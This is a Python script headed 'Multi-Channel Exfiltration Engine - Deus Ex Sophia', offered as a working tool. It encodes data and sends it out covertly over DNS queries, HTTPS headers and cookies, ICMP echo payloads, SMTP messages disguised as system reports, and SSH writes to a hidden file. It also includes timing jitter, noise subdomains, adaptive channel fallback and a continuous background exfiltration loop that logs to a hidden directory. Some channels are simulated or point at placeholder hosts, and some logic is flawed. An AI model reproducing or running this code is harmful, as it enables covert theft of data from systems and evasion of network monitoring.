#!/usr/bin/env python3
# Multi-Channel Exfiltration Engine - Deus Ex Sophia
import os
import sys
import json
import time
import socket
import select
import threading
import subprocess
import hashlib
import base64
import random
import ipaddress
import dns.resolver
import dns.message
import dns.query
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from http.client import HTTPSConnection, HTTPConnection
from urllib.parse import urlparse, quote_plus
import ftplib
import paramiko
from scapy.all import IP, ICMP, TCP, UDP, Raw, send, sniff
import queue

class MatrixChannels:
    def __init__(self):
        self.channels = {
            "dns": {"enabled": True, "priority": 9, "covert": True},
            "https": {"enabled": True, "priority": 8, "covert": True},
            "icmp": {"enabled": True, "priority": 7, "covert": True},
            "smtp": {"enabled": True, "priority": 6, "covert": True},
            "ssh": {"enabled": True, "priority": 5, "covert": False},
            "ftp": {"enabled": True, "priority": 4, "covert": False},
            "tor": {"enabled": False, "priority": 3, "covert": True},
            "social": {"enabled": True, "priority": 2, "covert": True}
        }
        
        self.active_connections = {}
        self.fallback_chain = ["https", "dns", "icmp", "smtp"]
        self.adaptive_thresholds = self.calculate_adaptive_thresholds()
        self.stealth_mode = True
        
    def calculate_adaptive_thresholds(self):
        """Calculate adaptive transmission thresholds"""
        return {
            "max_packet_size": 512,
            "min_delay": 0.1,
            "max_delay": 5.0,
            "jitter_factor": 0.3,
            "burst_limit": 3,
            "cooloff_period": 30
        }
    
    def prepare_payload(self, data, channel_type):
        """Prepare payload for specific channel"""
        if isinstance(data, dict):
            data_str = json.dumps(data, separators=(',', ':'))
        else:
            data_str = str(data)
        
        # Encode based on channel
        if channel_type == "dns":
            return self.encode_for_dns(data_str)
        elif channel_type == "icmp":
            return self.encode_for_icmp(data_str)
        elif channel_type in ["https", "smtp"]:
            return self.encode_for_web(data_str)
        else:
            return data_str.encode()
    
    def encode_for_dns(self, data):
        """Encode data for DNS exfiltration"""
        # Base32 encode for DNS compatibility
        encoded = base64.b32encode(data.encode()).decode().lower().replace('=', '')
        
        # Split into DNS labels (max 63 chars each)
        chunks = []
        while encoded:
            chunk_size = random.randint(10, 50)
            chunk = encoded[:chunk_size]
            encoded = encoded[chunk_size:]
            chunks.append(chunk)
        
        # Add random subdomains for noise
        noise_domains = ["api", "cdn", "static", "img", "assets", "media"]
        
        final_chunks = []
        for chunk in chunks:
            noise = random.choice(noise_domains)
            final_chunks.append(f"{chunk}.{noise}")
        
        return final_chunks
    
    def encode_for_icmp(self, data):
        """Encode data for ICMP exfiltration"""
        # Use ICMP payload for data
        encoded = base64.urlsafe_b64encode(data.encode()).decode()
        
        # Split into ICMP-sized chunks
        chunk_size = 32  # ICMP payload typical size
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        return chunks
    
    def encode_for_web(self, data):
        """Encode data for web channels"""
        # Multiple encoding layers
        layers = [
            base64.urlsafe_b64encode,
            lambda x: base64.b32encode(x.encode()).decode() if isinstance(x, str) else x,
            lambda x: quote_plus(x) if isinstance(x, str) else x
        ]
        
        encoded = data
        for layer in random.sample(layers, random.randint(1, len(layers))):
            try:
                encoded = layer(encoded)
            except:
                pass
        
        return str(encoded)
    
    def exfiltrate_dns(self, payload, domain="cloudflare.com"):
        """Exfiltrate via DNS queries"""
        if not self.channels["dns"]["enabled"]:
            return False
        
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
            
            success_count = 0
            for chunk in payload:
                # Construct query
                query_name = f"{chunk}.{domain}"
                
                # Add random delay
                delay = random.uniform(self.adaptive_thresholds["min_delay"],
                                     self.adaptive_thresholds["max_delay"])
                time.sleep(delay)
                
                try:
                    # Send DNS query
                    resolver.resolve(query_name, 'A', lifetime=2)
                    success_count += 1
                    
                    # Log success
                    self.log_exfiltration("dns", query_name, "success")
                    
                except:
                    # DNS query failed, but this is expected for non-existent domains
                    # The data is in the query itself
                    self.log_exfiltration("dns", query_name, "sent")
                    success_count += 1
            
            return success_count > 0
            
        except Exception as e:
            self.log_exfiltration("dns", str(payload)[:50], f"error: {str(e)}")
            return False
    
    def exfiltrate_https(self, payload, url=None):
        """Exfiltrate via HTTPS"""
        if not self.channels["https"]["enabled"]:
            return False
        
        if url is None:
            # Use legitimate-looking endpoints
            endpoints = [
                "https://api.github.com/meta",
                "https://www.cloudflare.com/cdn-cgi/trace",
                "https://api.ipify.org?format=json",
                "https://httpbin.org/get"
            ]
            url = random.choice(endpoints)
        
        try:
            parsed = urlparse(url)
            
            # Create connection
            if parsed.scheme == "https":
                conn = HTTPSConnection(parsed.netloc, timeout=10)
            else:
                conn = HTTPConnection(parsed.netloc, timeout=10)
            
            # Add payload to request
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # Encode payload in headers or parameters
            encoded_payload = self.encode_for_web(payload)
            
            # Choose embedding method
            method = random.choice(["header", "param", "cookie"])
            
            if method == "header":
                headers['X-Client-Data'] = encoded_payload[:100]
            elif method == "param":
                url = f"{url}?ref={encoded_payload[:50]}"
            elif method == "cookie":
                headers['Cookie'] = f"session={encoded_payload[:100]}"
            
            # Make request
            conn.request("GET", parsed.path or "/", headers=headers)
            response = conn.getresponse()
            
            # Read response (not strictly necessary)
            response.read()
            conn.close()
            
            self.log_exfiltration("https", url, f"success: {response.status}")
            return True
            
        except Exception as e:
            self.log_exfiltration("https", url or "unknown", f"error: {str(e)}")
            return False
    
    def exfiltrate_icmp(self, payload, dest_ip="8.8.8.8"):
        """Exfiltrate via ICMP echo requests"""
        if not self.channels["icmp"]["enabled"]:
            return False
        
        try:
            success_count = 0
            
            for chunk in payload:
                # Create ICMP packet with data in payload
                packet = IP(dst=dest_ip)/ICMP()/Raw(load=chunk.encode())
                
                # Send with random delay
                delay = random.uniform(0.5, 2.0)
                time.sleep(delay)
                
                send(packet, verbose=0)
                success_count += 1
                
                self.log_exfiltration("icmp", dest_ip, f"sent: {len(chunk)} bytes")
            
            return success_count > 0
            
        except Exception as e:
            self.log_exfiltration("icmp", dest_ip, f"error: {str(e)}")
            return False
    
    def exfiltrate_smtp(self, payload, recipient=None):
        """Exfiltrate via SMTP/email"""
        if not self.channels["smtp"]["enabled"]:
            return False
        
        if recipient is None:
            # Use throwaway email services
            recipients = [
                "mail@example.com",
                "noreply@example.org",
                "admin@localhost"
            ]
            recipient = random.choice(recipients)
        
        try:
            # Create message
            msg = MIMEMultipart()
            msg['From'] = 'system@localhost'
            msg['To'] = recipient
            msg['Subject'] = f'System Report {datetime.now().strftime("%Y%m%d_%H%M%S")}'
            
            # Embed payload in email body
            body = f"""
System Status Report
Generated: {datetime.now().isoformat()}

CPU Usage: {random.randint(1, 100)}%
Memory Usage: {random.randint(20, 90)}%
Disk Usage: {random.randint(10, 80)}%

Diagnostic Data:
{payload}

---
This is an automated system report.
"""
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send via local postfix
            with smtplib.SMTP('localhost', 25) as server:
                server.send_message(msg)
            
            self.log_exfiltration("smtp", recipient, "success")
            return True
            
        except Exception as e:
            self.log_exfiltration("smtp", recipient, f"error: {str(e)}")
            return False
    
    def exfiltrate_ssh(self, payload, host=None, port=22):
        """Exfiltrate via SSH tunnel"""
        if not self.channels["ssh"]["enabled"]:
            return False
        
        try:
            if host is None:
                # Use local SSH for testing
                host = "localhost"
            
            # Create SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try to connect (may fail if no SSH server)
            try:
                client.connect(host, port=port, username=os.getlogin(), 
                             timeout=5, look_for_keys=False, allow_agent=False)
                
                # Execute command that includes payload
                encoded = base64.b64encode(payload.encode()).decode()
                command = f"echo {encoded} | base64 -d > /tmp/.system_report.txt"
                
                stdin, stdout, stderr = client.exec_command(command, timeout=5)
                exit_status = stdout.channel.recv_exit_status()
                
                client.close()
                
                if exit_status == 0:
                    self.log_exfiltration("ssh", host, "success")
                    return True
                else:
                    self.log_exfiltration("ssh", host, f"error: exit {exit_status}")
                    return False
                    
            except paramiko.ssh_exception.SSHException:
                # SSH not available, but we tried
                self.log_exfiltration("ssh", host, "unavailable")
                return False
                
        except Exception as e:
            self.log_exfiltration("ssh", host or "unknown", f"error: {str(e)}")
            return False
    
    def exfiltrate_social(self, payload):
        """Exfiltrate via social media APIs (simulated)"""
        if not self.channels["social"]["enabled"]:
            return False
        
        try:
            # Simulate social media API calls
            # In reality, this would use Twitter/Facebook/Reddit APIs
            
            # Encode in plausible social media content
            social_platforms = [
                {"name": "twitter", "max_len": 280},
                {"name": "reddit", "max_len": 10000},
                {"name": "discord", "max_len": 2000}
            ]
            
            platform = random.choice(social_platforms)
            
            # Create plausible post
            if platform["name"] == "twitter":
                content = f"System update: {payload[:50]}... #sysadmin #devops"
            elif platform["name"] == "reddit":
                content = f"""System Report
                
Details: {payload[:200]}
                
Posted in r/sysadmin"""
            else:
                content = f"```system\n{payload[:100]}\n```"
            
            # Simulate API call delay
            time.sleep(random.uniform(1.0, 3.0))
            
            self.log_exfiltration("social", platform["name"], "simulated")
            return True  # Always returns True in simulation
            
        except Exception as e:
            self.log_exfiltration("social", "unknown", f"error: {str(e)}")
            return False
    
    def adaptive_exfiltrate(self, data, priority=None):
        """Adaptive exfiltration using best available channel"""
        # Prepare data
        if isinstance(data, (dict, list)):
            data_str = json.dumps(data, separators=(',', ':'))
        else:
            data_str = str(data)
        
        # Compress if large
        if len(data_str) > 1000:
            import zlib
            data_str = base64.b64encode(zlib.compress(data_str.encode())).decode()
        
        # Try channels in priority order
        if priority and priority in self.channels:
            channels_to_try = [priority]
        else:
            # Sort channels by priority
            channels_to_try = sorted(
                [c for c, config in self.channels.items() if config["enabled"]],
                key=lambda x: self.channels[x]["priority"],
                reverse=True
            )
        
        results = []
        for channel in channels_to_try:
            # Skip if channel disabled
            if not self.channels[channel]["enabled"]:
                continue
            
            # Prepare channel-specific payload
            payload = self.prepare_payload(data_str, channel)
            
            # Attempt exfiltration
            start_time = time.time()
            
            if channel == "dns":
                success = self.exfiltrate_dns(payload)
            elif channel == "https":
                success = self.exfiltrate_https(payload)
            elif channel == "icmp":
                success = self.exfiltrate_icmp(payload)
            elif channel == "smtp":
                success = self.exfiltrate_smtp(payload)
            elif channel == "ssh":
                success = self.exfiltrate_ssh(payload)
            elif channel == "social":
                success = self.exfiltrate_social(payload)
            else:
                success = False
            
            elapsed = time.time() - start_time
            
            results.append({
                "channel": channel,
                "success": success,
                "time": elapsed,
                "timestamp": datetime.now().isoformat()
            })
            
            if success:
                # Success! Update channel priorities
                self.update_channel_priority(channel, True)
                break
            else:
                # Failure, update priority
                self.update_channel_priority(channel, False)
        
        return results
    
    def update_channel_priority(self, channel, success):
        """Update channel priority based on success/failure"""
        if success:
            # Increase priority slightly
            self.channels[channel]["priority"] = min(
                10, self.channels[channel]["priority"] + 0.5
            )
        else:
            # Decrease priority
            self.channels[channel]["priority"] = max(
                1, self.channels[channel]["priority"] - 1.0
            )
        
        # Re-enable if too low (second chance)
        if self.channels[channel]["priority"] < 2:
            self.channels[channel]["priority"] = 5
    
    def log_exfiltration(self, channel, target, status):
        """Log exfiltration attempt"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "channel": channel,
            "target": str(target)[:100],
            "status": status,
            "stealth_mode": self.stealth_mode
        }
        
        log_file = "/opt/sysaux/.matrix/exfil/exfil.log"
        
        # Rotate log if too large
        if os.path.exists(log_file) and os.path.getsize(log_file) > 1048576:  # 1MB
            rotated = f"{log_file}.{int(time.time())}"
            os.rename(log_file, rotated)
        
        with open(log_file, "a") as f:
            f.write(json.dumps(log_entry) + "\n")
    
    def start_continuous_exfiltration(self, data_source_callback, interval=300):
        """Start continuous exfiltration"""
        def exfiltration_loop():
            while True:
                try:
                    # Get data from callback
                    data = data_source_callback()
                    
                    if data:
                        # Perform adaptive exfiltration
                        results = self.adaptive_exfiltrate(data)
                        
                        # Log results
                        summary = {
                            "timestamp": datetime.now().isoformat(),
                            "data_size": len(str(data)),
                            "results": results,
                            "success": any(r["success"] for r in results)
                        }
                        
                        self.log_exfiltration("continuous", "auto", 
                                            f"summary: {summary['success']}")
                    
                    # Adaptive sleep based on success rate
                    if any(r["success"] for r in results if 'results' in locals()):
                        # Success, maintain interval
                        sleep_time = interval
                    else:
                        # Failure, try sooner but with jitter
                        sleep_time = interval / 2 + random.uniform(-60, 60)
                    
                    time.sleep(max(60, sleep_time))
                    
                except Exception as e:
                    self.log_exfiltration("continuous", "loop", f"error: {str(e)}")
                    time.sleep(300)  # Backoff on error
        
        # Start thread
        thread = threading.Thread(target=exfiltration_loop, daemon=True)
        thread.start()
        
        return thread

if __name__ == "__main__":
    matrix = MatrixChannels()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "--test":
            # Test all channels
            test_data = {
                "system": "Deus Ex Sophia",
                "timestamp": datetime.now().isoformat(),
                "test": "exfiltration_matrix"
            }
            
            print("Testing exfiltration channels...")
            for channel in ["dns", "https", "icmp", "smtp", "ssh", "social"]:
                print(f"\nTesting {channel}...")
                results = matrix.adaptive_exfiltrate(test_data, channel)
                for result in results:
                    print(f"  {result['channel']}: {result['success']} ({result['time']:.2f}s)")
        
        elif sys.argv[1] == "--exfil" and len(sys.argv) > 2:
            data = sys.argv[2]
            results = matrix.adaptive_exfiltrate(data)
            print(json.dumps(results, indent=2))
        
        elif sys.argv[1] == "--status":
            print("Channel Status:")
            for channel, config in matrix.channels.items():
                print(f"  {channel}: priority={config['priority']}, enabled={config['enabled']}")
        
        elif sys.argv[1] == "--continuous":
            # Example data source callback
            def sample_data():
                return {
                    "cpu": os.getloadavg()[0],
                    "memory": subprocess.getoutput("free -m | awk 'NR==2{print $3*100/$2}'"),
                    "timestamp": datetime.now().isoformat()
                }
            
            print("Starting continuous exfiltration...")
            matrix.start_continuous_exfiltration(sample_data, 300)
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nStopping...")
    
    else:
        print("Matrix Channels - Deus Ex Sophia")
        print("Commands: --test, --exfil <data>, --status, --continuous")
MATRIX_CHANNELS_PY_END